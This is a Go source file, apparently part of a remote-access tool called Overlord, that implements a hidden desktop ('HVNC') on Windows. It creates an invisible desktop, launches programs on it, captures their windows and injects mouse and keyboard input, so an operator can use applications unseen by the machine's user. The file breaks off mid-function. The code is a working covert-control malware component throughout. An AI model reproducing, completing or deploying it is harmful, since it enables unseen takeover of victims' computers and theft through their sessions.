//go:build windows

package capture

import (
	"fmt"
	"image"
	"log"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	procCreateDesktopW      = user32.NewProc("CreateDesktopW")
	procOpenDesktopW        = user32.NewProc("OpenDesktopW")
	procCloseDesktop        = user32.NewProc("CloseDesktop")
	procSetThreadDesktop    = user32.NewProc("SetThreadDesktop")
	procGetThreadDesktop    = user32.NewProc("GetThreadDesktop")
	procSwitchDesktop       = user32.NewProc("SwitchDesktop")
	procGetCurrentThreadId  = kernel32.NewProc("GetCurrentThreadId")
	procGetDesktopWindow    = user32.NewProc("GetDesktopWindow")
	procGetWindowRect       = user32.NewProc("GetWindowRect")
	procIsWindowVisible     = user32.NewProc("IsWindowVisible")
	procPrintWindow         = user32.NewProc("PrintWindow")
	procGetWindow           = user32.NewProc("GetWindow")
	procGetTopWindow        = user32.NewProc("GetTopWindow")
	procCreateProcessW      = kernel32.NewProc("CreateProcessW")
	procSendInputHVNC       = user32.NewProc("SendInput")
	procSetCursorPosHVNC    = user32.NewProc("SetCursorPos")
	procGetCursorPosHVNC    = user32.NewProc("GetCursorPos")
	procWindowFromPoint     = user32.NewProc("WindowFromPoint")
	procScreenToClient      = user32.NewProc("ScreenToClient")
	procPostMessageW        = user32.NewProc("PostMessageW")
	procSendMessageW        = user32.NewProc("SendMessageW")
	procSetWindowPos        = user32.NewProc("SetWindowPos")
	procSetForegroundWindow = user32.NewProc("SetForegroundWindow")
	procSetActiveWindow     = user32.NewProc("SetActiveWindow")
	procSetFocus            = user32.NewProc("SetFocus")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procMapVirtualKeyW      = user32.NewProc("MapVirtualKeyW")
	procToUnicode           = user32.NewProc("ToUnicode")
)

const (
	DESKTOP_READOBJECTS     = 0x0001
	DESKTOP_CREATEWINDOW    = 0x0002
	DESKTOP_CREATEMENU      = 0x0004
	DESKTOP_HOOKCONTROL     = 0x0008
	DESKTOP_JOURNALRECORD   = 0x0010
	DESKTOP_JOURNALPLAYBACK = 0x0020
	DESKTOP_ENUMERATE       = 0x0040
	DESKTOP_WRITEOBJECTS    = 0x0080
	DESKTOP_SWITCHDESKTOP   = 0x0100

	GENERIC_ALL = 0x10000000

	DESKTOP_ALL_ACCESS = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
		DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD |
		DESKTOP_JOURNALPLAYBACK | DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_ALL

	GW_HWNDFIRST         = 0
	GW_HWNDLAST          = 1
	GW_HWNDNEXT          = 2
	GW_HWNDPREV          = 3
	PW_RENDERFULLCONTENT = 0x00000002

	STARTF_USEPOSITION     = 0x00000004
	CREATE_NEW_CONSOLE     = 0x00000010
	MOUSEEVENTF_MOVE       = 0x0001
	MOUSEEVENTF_LEFTDOWN   = 0x0002
	MOUSEEVENTF_LEFTUP     = 0x0004
	MOUSEEVENTF_RIGHTDOWN  = 0x0008
	MOUSEEVENTF_RIGHTUP    = 0x0010
	MOUSEEVENTF_MIDDLEDOWN = 0x0020
	MOUSEEVENTF_MIDDLEUP   = 0x0040
	INPUT_MOUSE            = 0
	INPUT_KEYBOARD         = 1
	KEYEVENTF_KEYUP        = 0x0002
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_CAPITAL             = 0x14
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	WM_MOUSEMOVE           = 0x0200
	WM_LBUTTONDOWN         = 0x0201
	WM_LBUTTONUP           = 0x0202
	WM_RBUTTONDOWN         = 0x0204
	WM_RBUTTONUP           = 0x0205
	WM_MBUTTONDOWN         = 0x0207
	WM_MBUTTONUP           = 0x0208
	WM_NCHITTEST           = 0x0084
	WM_NCLBUTTONDOWN       = 0x00A1
	WM_NCLBUTTONUP         = 0x00A2
	WM_CLOSE               = 0x0010
	WM_KEYDOWN             = 0x0100
	WM_KEYUP               = 0x0101
	WM_CHAR                = 0x0102
	WM_MOUSEWHEEL          = 0x020A
	MK_LBUTTON             = 0x0001
	MK_RBUTTON             = 0x0002
	MK_MBUTTON             = 0x0010
	WHEEL_DELTA            = 120
	HTCAPTION              = 2
	HTCLOSE                = 20
	HTMINBUTTON            = 8
	HTMAXBUTTON            = 9
	HTLEFT                 = 10
	HTRIGHT                = 11
	HTTOP                  = 12
	HTTOPLEFT              = 13
	HTTOPRIGHT             = 14
	HTBOTTOM               = 15
	HTBOTTOMLEFT           = 16
	HTBOTTOMRIGHT          = 17
)

var (
	hvncDesktopHandle   uintptr
	hvncDesktopMu       sync.Mutex
	hvncDesktopName     = "OverlordHiddenDesktop"
	hvncInitialized     bool
	hvncOriginalDesktop uintptr
	hvncCursorEnabled   bool
	hvncThreadOnce      sync.Once
	hvncThreadErr       error
	hvncThreadReady     chan struct{}
	hvncThreadTasks     chan hvncTask
	hvncNoWindowLogNs   atomic.Int64
	hvncInputMu         sync.Mutex
	hvncLastCursor      point
	hvncHasCursor       bool
	hvncWorkingWindow   uintptr
	hvncShiftDown       bool
	hvncCtrlDown        bool
	hvncAltDown         bool
	hvncCapsLock        bool
	hvncMovingWindow    bool
	hvncMoveOffset      point
	hvncWindowSize      point
	hvncWindowToMove    uintptr
	hvncMouseButtons    uint32
)

type hvncTaskKind int

const (
	hvncTaskCapture hvncTaskKind = iota
	hvncTaskStartProcess
	hvncTaskMouseMove
	hvncTaskMouseDown
	hvncTaskMouseUp
	hvncTaskKeyDown
	hvncTaskKeyUp
	hvncTaskMouseWheel
)

type hvncTask struct {
	kind     hvncTaskKind
	display  int
	filePath string
	x        int32
	y        int32
	button   int
	vk       uint16
	delta    int32
	resp     chan hvncTaskResult
}

type hvncTaskResult struct {
	img *image.RGBA
	err error
}

type startupInfo struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdErr         uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessId uint32
	dwThreadId  uint32
}

type mouseInput struct {
	dx          int32
	dy          int32
	mouseData   uint32
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type keybdInput struct {
	wVk         uint16
	wScan       uint16
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type input struct {
	inputType uint32
	union     [24]byte
}

func getCurrentThreadId() uint32 {
	r, _, _ := procGetCurrentThreadId.Call()
	return uint32(r)
}

func getThreadDesktop(threadId uint32) uintptr {
	r, _, _ := procGetThreadDesktop.Call(uintptr(threadId))
	return r
}

func isWindowVisible(hwnd uintptr) bool {
	r, _, _ := procIsWindowVisible.Call(hwnd)
	return r != 0
}

func printWindow(hwnd, hdc uintptr, flags uint32) bool {
	r, _, _ := procPrintWindow.Call(hwnd, hdc, uintptr(flags))
	return r != 0
}

func getWindow(hwnd uintptr, cmd uint32) uintptr {
	r, _, _ := procGetWindow.Call(hwnd, uintptr(cmd))
	return r
}

func getTopWindow(hwnd uintptr) uintptr {
	r, _, _ := procGetTopWindow.Call(hwnd)
	return r
}

func InitializeHVNCDesktop() error {
	hvncDesktopMu.Lock()
	defer hvncDesktopMu.Unlock()

	if hvncInitialized && hvncDesktopHandle != 0 {
		return nil
	}

	threadId := getCurrentThreadId()
	hvncOriginalDesktop = getThreadDesktop(threadId)

	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return fmt.Errorf("failed to convert desktop name: %v", err)
	}

	r, _, _ := procOpenDesktopW.Call(
		uintptr(unsafe.Pointer(desktopNamePtr)),
		0,
		0,
		uintptr(DESKTOP_ALL_ACCESS),
	)

	if r == 0 {
		r, _, err = procCreateDesktopW.Call(
			uintptr(unsafe.Pointer(desktopNamePtr)),
			0,
			0,
			0,
			uintptr(DESKTOP_ALL_ACCESS),
			0,
		)

		if r == 0 {
			return fmt.Errorf("failed to create hidden desktop: %v", err)
		}
	}

	hvncDesktopHandle = r
	hvncInitialized = true
	return nil
}

func CleanupHVNCDesktop() {
	hvncDesktopMu.Lock()
	defer hvncDesktopMu.Unlock()

	if hvncDesktopHandle != 0 {
		if hvncOriginalDesktop != 0 {
			procSetThreadDesktop.Call(hvncOriginalDesktop)
		}

		procCloseDesktop.Call(hvncDesktopHandle)
		hvncDesktopHandle = 0
	}
	hvncInitialized = false
	if hvncThreadTasks != nil {
		close(hvncThreadTasks)
		hvncThreadTasks = nil
	}
	hvncThreadReady = nil
	hvncThreadErr = nil
	hvncThreadOnce = sync.Once{}
}

func SetHVNCCursorCapture(enabled bool) {
	hvncCursorEnabled = enabled
}

func hvncDesktopBounds() (image.Rectangle, bool) {
	hwnd, _, _ := procGetDesktopWindow.Call()
	if hwnd == 0 {
		return image.Rectangle{}, false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return image.Rectangle{}, false
	}
	if r.right <= r.left || r.bottom <= r.top {
		return image.Rectangle{}, false
	}
	return image.Rect(int(r.left), int(r.top), int(r.right), int(r.bottom)), true
}

func ensureHVNCThread() error {
	hvncDesktopMu.Lock()
	desktopHandle := hvncDesktopHandle
	hvncDesktopMu.Unlock()

	if desktopHandle == 0 {
		return fmt.Errorf("hvnc desktop not initialized")
	}

	hvncThreadOnce.Do(func() {
		hvncThreadReady = make(chan struct{})
		hvncThreadTasks = make(chan hvncTask)
		go func(handle uintptr) {
			defer recoverAndLog("hvnc desktop thread", nil)
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			r, _, err := procSetThreadDesktop.Call(handle)
			if r == 0 {
				hvncThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
				close(hvncThreadReady)
				for task := range hvncThreadTasks {
					task.resp <- hvncTaskResult{nil, hvncThreadErr}
				}
				return
			}

			close(hvncThreadReady)
			for task := range hvncThreadTasks {
				switch task.kind {
				case hvncTaskStartProcess:
					err := startHVNCProcessOnThread(task.filePath)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskMouseMove:
					err := hvncMouseMoveOnThread(task.display, task.x, task.y)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskMouseDown:
					err := hvncMouseButtonOnThread(task.button, true)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskMouseUp:
					err := hvncMouseButtonOnThread(task.button, false)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskKeyDown:
					err := hvncKeyOnThread(task.vk, true)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskKeyUp:
					err := hvncKeyOnThread(task.vk, false)
					task.resp <- hvncTaskResult{nil, err}
				case hvncTaskMouseWheel:
					err := hvncMouseWheelOnThread(task.delta)
					task.resp <- hvncTaskResult{nil, err}
				default:
					img, err := hvncCaptureDisplayOnThread(task.display)
					task.resp <- hvncTaskResult{img, err}
				}
			}
		}(desktopHandle)
	})

	if hvncThreadReady != nil {
		<-hvncThreadReady
	}

	return hvncThreadErr
}

func hvncCaptureDisplay(display int) (*image.RGBA, error) {
	if err := ensureHVNCThread(); err != nil {
		return nil, err
	}

	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskCapture, display: display, resp: resp}
	result := <-resp
	return result.img, result.err
}

func StartHVNCProcess(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskStartProcess, filePath: filePath, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputMouseMove(display int, x, y int32) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseMove, display: display, x: x, y: y, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputMouseDown(button int) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseDown, button: button, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputMouseUp(button int) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseUp, button: button, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputKeyDown(vk uint16) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskKeyDown, vk: vk, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputKeyUp(vk uint16) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskKeyUp, vk: vk, resp: resp}
	result := <-resp
	return result.err
}

func HVNCInputMouseWheel(delta int32) error {
	if err := ensureHVNCThread(); err != nil {
		return err
	}
	resp := make(chan hvncTaskResult, 1)
	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseWheel, delta: delta, resp: resp}
	result := <-resp
	return result.err
}

func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
	captureMu.Lock()
	defer captureMu.Unlock()

	setDPIAware()

	maxDisplays := displayCount()
	if maxDisplays <= 0 {
		maxDisplays = 1
	}
	if display < 0 || display >= maxDisplays {
		log.Printf("hvnc capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
		display = 0
	}

	bounds, boundsSource := hvncResolveCaptureBounds(display)
	srcW := bounds.Dx()
	srcH := bounds.Dy()
	if srcW <= 0 || srcH <= 0 {
		log.Printf("hvnc capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		return nil, syscall.EINVAL
	}

	userScale := captureScale()
	dstW := int(float64(srcW) * userScale)
	dstH := int(float64(srcH) * userScale)
	if dstW <= 0 || dstH <= 0 {
		dstW = srcW
		dstH = srcH
	}

	capW := srcW
	capH := srcH

	hdcScreen := getDC(0)
	if hdcScreen == 0 {
		return nil, syscall.EINVAL
	}
	defer releaseDC(0, hdcScreen)

	hdcMem := createCompatibleDC(hdcScreen)
	if hdcMem == 0 {
		return nil, syscall.EINVAL
	}
	defer deleteDC(hdcMem)

	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(capW),
			biHeight:      -int32(capH),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	var bits unsafe.Pointer
	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
	if hbmp == 0 || bits == nil {
		return nil, syscall.EINVAL
	}
	selectObject(hdcMem, hbmp)

	buf := unsafe.Slice((*byte)(bits), capW*capH*4)
	for i := range buf {
		buf[i] = 0
	}

	drawn := drawHVNCWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
	if drawn == 0 {
		now := time.Now().UnixNano()
		last := hvncNoWindowLogNs.Load()
		if now-last > int64(5*time.Second) && hvncNoWindowLogNs.CompareAndSwap(last, now) {
			log.Printf("hvnc capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		}
	}

	swapRB(buf)
	img := image.NewRGBA(image.Rect(0, 0, capW, capH))
	copy(img.Pix, buf)

	deleteObject(hbmp)

	if hvncCursorEnabled {
		DrawCursorOnImage(img, bounds)
	}

	if dstW != capW || dstH != capH {
		img = resizeNearest(img, dstW, dstH)
	}

	return img, nil
}

func startHVNCProcessOnThread(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}

	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
	if err != nil {
		return fmt.Errorf("failed to convert desktop name: %v", err)
	}
	cmdLine, err := syscall.UTF16FromString(filePath)
	if err != nil {
		return fmt.Errorf("failed to convert command line: %v", err)
	}
	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.lpDesktop = desktopNamePtr
	si.dwX = 0
	si.dwY = 0
	si.dwFlags = STARTF_USEPOSITION

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		uintptr(CREATE_NEW_CONSOLE),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return fmt.Errorf("CreateProcess failed: %v", callErr)
		}
		return fmt.Errorf("CreateProcess failed")
	}
	return nil
}

func hvncMouseMoveOnThread(display int, x, y int32) error {
	bounds, _ := hvncResolveCaptureBounds(display)
	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
		procSetCursorPosHVNC.Call(uintptr(x), uintptr(y))
		hvncInputMu.Lock()
		hvncLastCursor = point{x: x, y: y}
		hvncHasCursor = true
		hvncInputMu.Unlock()
		return nil
	}

	absX := bounds.Min.X + int(x)
	absY := bounds.Min.Y + int(y)
	if absX < bounds.Min.X {
		absX = bounds.Min.X
	}
	if absY < bounds.Min.Y {
		absY = bounds.Min.Y
	}
	if absX >= bounds.Max.X {
		absX = bounds.Max.X - 1
	}
	if absY >= bounds.Max.Y {
		absY = bounds.Max.Y - 1
	}

	procSetCursorPosHVNC.Call(uintptr(absX), uintptr(absY))
	hvncInputMu.Lock()
	hvncLastCursor = point{x: int32(absX), y: int32(absY)}
	hvncHasCursor = true
	hvncInputMu.Unlock()
	moveHVNCWindowIfDragging(point{x: int32(absX), y: int32(absY)})

	pt := point{x: int32(absX), y: int32(absY)}
	hwnd := windowFromPoint(pt)
	if hwnd != 0 {
		setWorkingWindow(hwnd)
		clientPt := pt
		procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))
		postMouseMessage(hwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
	}
	return nil
}

func hvncMouseButtonOnThread(button int, down bool) error {
	pt := currentHVNCCursor()
	hwnd := windowFromPoint(pt)
	if hwnd == 0 {
		return nil
	}
	setWorkingWindow(hwnd)
	if button == 0 {
		handleNonClientHit(hwnd, pt, down)
	}
	if button == 0 && !down {
		endHVNCWindowDrag(pt)
	}
	clientPt := pt
	procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))

	var msg uint32
	var wparam uintptr
	switch button {
	case 0:
		if down {
			msg = WM_LBUTTONDOWN
			wparam = uintptr(setMouseButton(button, true))
		} else {
			msg = WM_LBUTTONUP
			wparam = uintptr(setMouseButton(button, false))
		}
	case 1:
		if down {
			msg = WM_MBUTTONDOWN
			wparam = uintptr(setMouseButton(button, true))
		} else {
			msg = WM_MBUTTONUP
			wparam = uintptr(setMouseButton(button, false))
		}
	case 2:
		if down {
			msg = WM_RBUTTONDOWN
			wparam = uintptr(setMouseButton(button, true))
		} else {
			msg = WM_RBUTTONUP
			wparam = uintptr(setMouseButton(button, false))
		}
	default:
		return nil
	}

	postMouseMessage(hwnd, msg, wparam, clientPt)
	return nil
}

func hvncKeyOnThread(vk uint16, down bool) error {
	hwnd := getWorkingWindow()
	if hwnd == 0 {
		pt := currentHVNCCursor()
		hwnd = windowFromPoint(pt)
		if hwnd == 0 {
			return nil
		}
		setWorkingWindow(hwnd)
	}
	setWorkingWindow(hwnd)
	updateModifierState(vk, down)

	if isModifierVK(vk) {
		return nil
	}

	if down {
		if ch := virtualKeyToChars(vk); len(ch) > 0 && !isNonPrintableVK(vk) {
			for _, r := range ch {
				procPostMessageW.Call(hwnd, WM_CHAR, uintptr(r), uintptr(1))
			}
		} else {
			postKeyMessage(hwnd, WM_KEYDOWN, vk)
		}
	} else {
		postKeyMessage(hwnd, WM_KEYUP, vk)
	}
	return nil
}

func makeLParam(x, y int32) uintptr {
	return uintptr((uint32(y) << 16) | (uint32(x) & 0xFFFF))
}

func windowFromPoint(pt point) uintptr {
	ret, _, _ := procWindowFromPoint.Call(uintptr(*(*int64)(unsafe.Pointer(&pt))))
	return ret
}

func setWorkingWindow(hwnd uintptr) {
	if hwnd == 0 {
		return
	}
	hvncInputMu.Lock()
	hvncWorkingWindow = hwnd
	hvncInputMu.Unlock()
	procSetForegroundWindow.Call(hwnd)
	procSetActiveWindow.Call(hwnd)
	procSetFocus.Call(hwnd)
}

func getWorkingWindow() uintptr {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	return hvncWorkingWindow
}

func currentHVNCCursor() point {
	hvncInputMu.Lock()
	if hvncHasCursor {
		pt := hvncLastCursor
		hvncInputMu.Unlock()
		return pt
	}
	hvncInputMu.Unlock()
	var pt point
	procGetCursorPosHVNC.Call(uintptr(unsafe.Pointer(&pt)))
	return pt
}

func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
	procPostMessageW.Call(hwnd, uintptr(msg), wparam, makeLParam(pt.x, pt.y))
}

func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
	scan := mapVirtualKey(uint32(vk))
	lparam := uintptr(1 | (scan << 16))
	if msg == WM_KEYUP {
		lparam |= 1 << 30
		lparam |= 1 << 31
	}
	procPostMessageW.Call(hwnd, uintptr(msg), uintptr(vk), lparam)
}

func setMouseButton(button int, down bool) uint32 {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	var mask uint32
	switch button {
	case 0:
		mask = MK_LBUTTON
	case 1:
		mask = MK_MBUTTON
	case 2:
		mask = MK_RBUTTON
	default:
		return hvncMouseButtons
	}
	if down {
		hvncMouseButtons |= mask
	} else {
		hvncMouseButtons &^= mask
	}
	return hvncMouseButtons
}

func currentMouseButtons() uint32 {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	return hvncMouseButtons
}

func mapVirtualKey(vk uint32) uintptr {
	r, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)
	return r
}

func virtualKeyToChars(vk uint16) []rune {
	buf := make([]uint16, 8)
	state := buildKeyboardState()
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		mapVirtualKey(uint32(vk)),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if ret == 0 {
		return nil
	}
	if ret < 0 {
		ret = -ret
	}
	return []rune(syscall.UTF16ToString(buf[:ret]))
}

func handleNonClientHit(hwnd uintptr, screenPt point, down bool) {
	lparam := makeLParam(screenPt.x, screenPt.y)
	hit, _, _ := procSendMessageW.Call(hwnd, WM_NCHITTEST, 0, lparam)
	hitTest := int32(hit)

	if hitTest == HTCLOSE && !down {
		procPostMessageW.Call(hwnd, WM_CLOSE, 0, 0)
		return
	}

	if hitTest == HTCAPTION {
		if down {
			var r rect
			if ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
				hvncInputMu.Lock()
				hvncMovingWindow = true
				hvncWindowToMove = hwnd
				hvncMoveOffset = point{x: screenPt.x - r.left, y: screenPt.y - r.top}
				hvncWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
				hvncInputMu.Unlock()
			}
		} else {
			endHVNCWindowDrag(screenPt)
		}
		return
	}

	if hitTest == HTLEFT || hitTest == HTRIGHT || hitTest == HTTOP || hitTest == HTBOTTOM || hitTest == HTTOPLEFT || hitTest == HTTOPRIGHT || hitTest == HTBOTTOMLEFT || hitTest == HTBOTTOMRIGHT || hitTest == HTMINBUTTON || hitTest == HTMAXBUTTON {
		msg := WM_NCLBUTTONDOWN
		if !down {
			msg = WM_NCLBUTTONUP
		}
		procPostMessageW.Call(hwnd, uintptr(msg), uintptr(hitTest), lparam)
	}
}

func moveHVNCWindowIfDragging(screenPt point) {
	hvncInputMu.Lock()
	moving := hvncMovingWindow
	hwnd := hvncWindowToMove
	offset := hvncMoveOffset
	size := hvncWindowSize
	hvncInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func endHVNCWindowDrag(screenPt point) {
	hvncInputMu.Lock()
	moving := hvncMovingWindow
	hwnd := hvncWindowToMove
	offset := hvncMoveOffset
	size := hvncWindowSize
	hvncMovingWindow = false
	hvncWindowToMove = 0
	hvncInputMu.Unlock()
	if !moving || hwnd == 0 {
		return
	}
	newX := int32(screenPt.x) - offset.x
	newY := int32(screenPt.y) - offset.y
	procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func hvncMouseWheelOnThread(delta int32) error {
	pt := currentHVNCCursor()
	hwnd := getWorkingWindow()
	if hwnd == 0 {
		hwnd = windowFromPoint(pt)
		if hwnd == 0 {
			return nil
		}
		setWorkingWindow(hwnd)
	}
	clientPt := pt
	procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))
	wparam := uintptr(uint16(delta)) << 16
	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(clientPt.x, clientPt.y))
	return nil
}

func isNonPrintableVK(vk uint16) bool {
	if vk >= 0x70 && vk <= 0x7B { // F1-F12
		return true
	}
	switch vk {
	case 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28: // PageUp/Down, End, Home, Arrows
		return true
	case 0x2D, 0x2E: // Insert, Delete
		return true
	case 0x5B, 0x5C, 0x5D: // Win, Win, Apps
		return true
	case 0x91, 0x90: // Scroll, NumLock
		return true
	case 0x0D, 0x1B, 0x09, 0x08: // Enter, Escape, Tab, Backspace
		return true
	case 0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5, 0x14:
		return true
	default:
		return false
	}
}

func isModifierVK(vk uint16) bool {
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU, VK_CAPITAL:
		return true
	default:
		return false
	}
}

func updateModifierState(vk uint16, down bool) {
	hvncInputMu.Lock()
	defer hvncInputMu.Unlock()
	switch vk {
	case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
		hvncShiftDown = down
	case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
		hvncCtrlDown = down
	case VK_MENU, VK_LMENU, VK_RMENU:
		hvncAltDown = down
	case VK_CAPITAL:
		if down {
			hvncCapsLock = !hvncCapsLock
		}
	}
}

func buildKeyboardState() []byte {
	state := make([]byte, 256)
	hvncInputMu.Lock()
	shift := hvncShiftDown
	ctrl := hvncCtrlDown
	alt := hvncAltDown
	caps := hvncCapsLock
	hvncInputMu.Unlock()
	if shift {
		state[VK_SHIFT] = 0x80
	}
	if ctrl {
		state[VK_CONTROL] = 0x80
	}
	if alt {
		state[VK_MENU] = 0x80
	}
	if caps {
		state[VK_CAPITAL] = 0x01
	}
	return state
}

func HVNCMonitorCount() int {
	return displayCount()
}

func hvncResolveCaptureBounds(display int) (image.Rectangle, string) {
	mons := monitorList()
	if display >= 0 && display < len(mons) {
		mon := mons[display]
		bounds := captureBounds(mon)
		if bounds.Dx() > 0 && bounds.Dy() > 0 {
			return bounds, fmt.Sprintf("monitor=%d name=%q", display, mon.name)
		}
	}
	if desktopBounds, ok := hvncDesktopBounds(); ok {
		return desktopBounds, "desktop"
	}
	vx := int(getSystemMetric(SM_XVIRTUALSCREEN))
	vy := int(getSystemMetric(SM_YVIRTUALSCREEN))
	vw := int(getSystemMetric(SM_CXVIRTUALSCREEN))
	vh := int(getSystemMetric(SM_CYVIRTUALSCREEN))
	if vw > 0 && vh > 0 {
		return image.Rect(vx, vy, vx+vw, vy+vh), "virtual"
	}
	return image.Rectangle{}, "unknown"
}

func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
	hwnd := getTopWindow(0)
	if hwnd == 0 {
		return 0
	}
	hwnd = getWindow(hwnd, GW_HWNDLAST)
	if hwnd == 0 {
		return 0
	}

	drawn := 0
	for hwnd != 0 {
		if drawHVNCWindow(hdcScreen, hwnd, bounds, target, targetStride) {
			drawn++
		}
		hwnd = getWindow(hwnd, GW_HWNDPREV)
	}
	return drawn
}

func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
	if !isWindowVisible(hwnd) {
		return false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return false
	}
	winLeft := int(r.left)
	winTop := int(r.top)
	winRight := int(r.right)
	winBottom := int(r.bottom)
	if winRight <= winLeft || winBottom <= winTop {
		return false
	}
	if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
		return false
	}

	winW := winRight - winLeft
	winH := winBottom - winTop
	if winW <= 0 || winH <= 0 {
		return false
	}

	hdcMem := createCompatibleDC(hdcScreen)
	if hdcMem == 0 {
		return false
	}
	defer deleteDC(hdcMem)

	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
